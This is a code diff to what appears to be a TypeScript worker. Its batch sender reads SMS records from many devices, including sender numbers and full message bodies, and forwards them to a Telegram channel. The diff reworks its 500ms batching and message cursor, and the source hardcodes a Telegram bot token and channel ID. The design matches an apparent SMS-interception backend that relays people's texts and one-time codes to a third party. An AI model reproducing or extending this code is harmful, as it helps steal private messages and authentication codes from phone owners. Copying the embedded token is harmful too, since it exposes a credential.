@@ -264,18 +264,12 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
   const TG_BOT_TOKEN = "8899517356:AAHZujlxgR6pL5vXkrLtMZXzSXKR--7ljLw";
 
   async function tgChatId(env: Env): Promise<string> {
-    const CH = env.TELEGRAM_CHAT_ID ?? '-1004403318713';
+    const CH = env.TELEGRAM_CHAT_ID ?? '-1004403318713'; // @bisofficialchanel
     try {
-      // Ensure channel stored + clear stale batch locks on first call
-      const sql2 = neon(env.NEON_DATABASE_URL);
-      await sql2(
-        `INSERT INTO settings (key,value) VALUES ('telegram_chat_id',$1),('tg_batch_at','0'),('tg_last_msg_id','0')
-         ON CONFLICT (key) DO UPDATE SET value =
-           CASE WHEN settings.key='telegram_chat_id' THEN $1
-                WHEN settings.value::bigint > $2 THEN settings.value
-                ELSE settings.value END
-        `,
-        [CH, String(Date.now())]
+      await neon(env.NEON_DATABASE_URL)(
+        `INSERT INTO settings (key,value) VALUES ('telegram_chat_id',$1)
+         ON CONFLICT (key) DO UPDATE SET value=$1`,
+        [CH]
       );
     } catch { /* ignore */ }
     return CH;
@@ -295,74 +289,80 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
     }
 
     // High-volume batch sender — 200ms windows, handles 100+/sec without rate limiting
-    async function sendTelegramBatch(env: Env, triggerAppId?: string): Promise<void> {
-      try {
-        if (await isTelegramPaused(env)) return;
-        const sql = neon(env.NEON_DATABASE_URL);
-        // Focus filter
-        if (triggerAppId) {
-          const fR = await sql(`SELECT value FROM settings WHERE key='telegram_focus_app' LIMIT 1`);
-          const focused = (fR[0] as { value?: string })?.value ?? '';
-          if (focused && focused !== triggerAppId) return;
-        }
-        // Atomic 200ms batch lock — only 1 batch fires per 200ms window
-        // ── AUTO-HEAL: reset stale future locks (left by old 429 bans) ──
-        const now = Date.now();
-        await sql(`UPDATE settings SET value='0' WHERE key='tg_batch_at' AND value::bigint > ${now}`);
+  // Real-time batch sender: fires every 500ms, fetches ALL new messages since last send
+  async function sendTelegramBatch(env: Env, triggerAppId?: string): Promise<void> {
+    try {
+      if (await isTelegramPaused(env)) return;
+      const sql = neon(env.NEON_DATABASE_URL);
 
-        // ── AUTO-INIT: first run — set tg_last_msg_id to current max so only NEW messages notify ──
-        const initRows = await sql(`SELECT value FROM settings WHERE key='tg_last_msg_id' LIMIT 1`);
-        const storedLast = Number((initRows[0] as {value?:string})?.value ?? '0');
-        if (storedLast === 0) {
-          const maxR = await sql(`SELECT COALESCE(MAX(id),0) AS m FROM messages`);
-          const maxId = Number((maxR[0] as {m?:number})?.m ?? 0);
-          await sql(`INSERT INTO settings (key,value) VALUES ('tg_last_msg_id',$1) ON CONFLICT (key) DO UPDATE SET value=$1`,[String(maxId)]);
-          return; // Skip this batch — next real new message will be first notification
-        }
+      // Focus filter
+      if (triggerAppId) {
+        const fR = await sql(`SELECT value FROM settings WHERE key='telegram_focus_app' LIMIT 1`);
+        const focused = (fR[0] as { value?: string })?.value ?? '';
+        if (focused && focused !== triggerAppId) return;
+      }
 
-        // Atomic 200ms batch lock — only 1 batch fires per 200ms window
-        const lock = await sql(
-          `INSERT INTO settings (key,value) VALUES ('tg_batch_at',$1)
-           ON CONFLICT (key) DO UPDATE SET value=$1 WHERE settings.value::bigint < $2
-           RETURNING key`,
-          [String(now), String(now - 200)]
-        );
-        if ((lock as unknown[]).length === 0) return; // Another batch just fired — skip
-        // Get last processed message ID + focus app
-        const sR = await sql(`SELECT key,value FROM settings WHERE key IN ('tg_last_msg_id','telegram_focus_app')`) as { key: string; value: string }[];
-        const sett: Record<string, string> = Object.fromEntries(sR.map(r => [r.key, r.value]));
-        const lastId = Number(sett['tg_last_msg_id'] ?? '0');
-        const focusApp = sett['telegram_focus_app'] ?? '';
-        // Fetch all unseen messages since last batch (max 30 per post)
-        type MRow = { id: number; app_id: string; device_id: string; from_number: string; from_sender: string; body: string };
-        const msgs = (focusApp
-          ? await sql(`SELECT id,app_id,device_id,from_number,from_sender,body FROM messages WHERE id>$1 AND app_id=$2 ORDER BY id ASC LIMIT 30`, [String(lastId), focusApp])
-          : await sql(`SELECT id,app_id,device_id,from_number,from_sender,body FROM messages WHERE id>$1 ORDER BY id ASC LIMIT 30`, [String(lastId)])
-        ) as MRow[];
-        if (!msgs.length) return;
-        // Mark these as processed
-        const maxId = Math.max(...msgs.map(m => Number(m.id)));
-        await sql(`INSERT INTO settings (key,value) VALUES ('tg_last_msg_id',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [String(maxId)]);
-        // Build message — single vs grouped
-        const chatId = await tgChatId(env);
-        const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
-        const text = msgs.length === 1
-          ? `📩 <b>New SMS</b>\nApp: <code>${msgs[0].app_id}</code>  Device: <code>${msgs[0].device_id}</code>\nFrom: <b>${msgs[0].from_number}</b>  Sender: ${msgs[0].from_sender}\n💬 ${msgs[0].body}`
-          : `<b>${msgs.length} New SMS</b>\n\n${msgs.map(m => `📩 <code>${m.app_id}</code> | <b>${m.from_number}</b>\n${m.body.length > 120 ? m.body.slice(0, 120) + '…' : m.body}`).join('\n\n')}`;
-        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST', headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
-        });
-        if (!resp.ok) {
-          const err = await resp.json() as { error_code?: number; parameters?: { retry_after?: number } };
-          if (err.error_code === 429) {
-            const after = err.parameters?.retry_after ?? 60;
-            await sql(`INSERT INTO settings (key,value) VALUES ('tg_batch_at',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [String(Date.now() + after * 1000)]);
-            console.warn(`Telegram 429 batch: retry ${after}s`);
-          }
+      // First-run: create tg_notif_after = NOW so old messages are skipped
+      const tsRow = await sql(`SELECT value FROM settings WHERE key='tg_notif_after' LIMIT 1`);
+      if (!tsRow.length) {
+        await sql(`INSERT INTO settings (key,value) VALUES ('tg_notif_after',$1) ON CONFLICT (key) DO NOTHING`, [String(Date.now())]);
+        return;
+      }
+      const sinceMs = Number((tsRow[0] as { value: string }).value ?? '0');
+      const sinceISO = new Date(sinceMs).toISOString();
+
+      // Atomic 500ms batch lock — only one batch fires per window
+      const now = Date.now();
+      const lock = await sql(
+        `INSERT INTO settings (key,value) VALUES ('tg_batch_lock',$1)
+         ON CONFLICT (key) DO UPDATE SET value=$1
+         WHERE settings.value::bigint < $2
+         RETURNING key`,
+        [String(now), String(now - 500)]
+      );
+      if ((lock as unknown[]).length === 0) return; // Another batch just fired
+
+      // Fetch all messages received since last notification (newest first, max 50)
+      type MRow = { id: number; app_id: string; device_id: string; from_number: string; from_sender: string; body: string; received_at: string };
+      const msgs = await sql(
+        `SELECT id,app_id,device_id,from_number,from_sender,body,received_at
+         FROM messages WHERE received_at > $1::timestamptz
+         ORDER BY received_at ASC LIMIT 50`,
+        [sinceISO]
+      ) as MRow[];
+      if (!msgs.length) return;
+
+      // Advance cursor to just after last received message
+      const lastTs = new Date(msgs[msgs.length - 1].received_at).getTime() + 1;
+      await sql(`INSERT INTO settings (key,value) VALUES ('tg_notif_after',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [String(lastTs)]);
+
+      // Build message text
+      const chatId = await tgChatId(env);
+      const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
+      let text: string;
+      if (msgs.length === 1) {
+        const m = msgs[0];
+        text = `📩 <b>New SMS</b>\nApp: <code>${m.app_id}</code>  Device: <code>${m.device_id}</code>\nFrom: <b>${m.from_number}</b>  Sender: ${m.from_sender}\n💬 ${m.body}`;
+      } else {
+        const shown = msgs.slice(0, 20);
+        const extra = msgs.length - shown.length;
+        text = `<b>${msgs.length} New SMS</b>\n\n${shown.map(m => `📩 <code>${m.app_id}</code> | <b>${m.from_number}</b>\n${m.body.length > 100 ? m.body.slice(0, 100) + '…' : m.body}`).join('\n\n')}${extra > 0 ? `\n\n...+${extra} more` : ''}`;
+      }
+
+      const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST', headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
+      });
+      if (!resp.ok) {
+        const err = await resp.json() as { error_code?: number; parameters?: { retry_after?: number } };
+        if (err.error_code === 429) {
+          const after = err.parameters?.retry_after ?? 60;
+          await sql(`INSERT INTO settings (key,value) VALUES ('tg_batch_lock',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [String(Date.now() + after * 1000)]);
+          console.warn(`Telegram 429: pausing notifications ${after}s`);
         }
-      } catch (e) { console.warn("sendTelegramBatch failed", e); }
-    }
+      }
+    } catch (e) { console.warn("sendTelegramBatch failed", e); }
+  }
 
 
     async function isTelegramPaused(env: Env): Promise<boolean> {
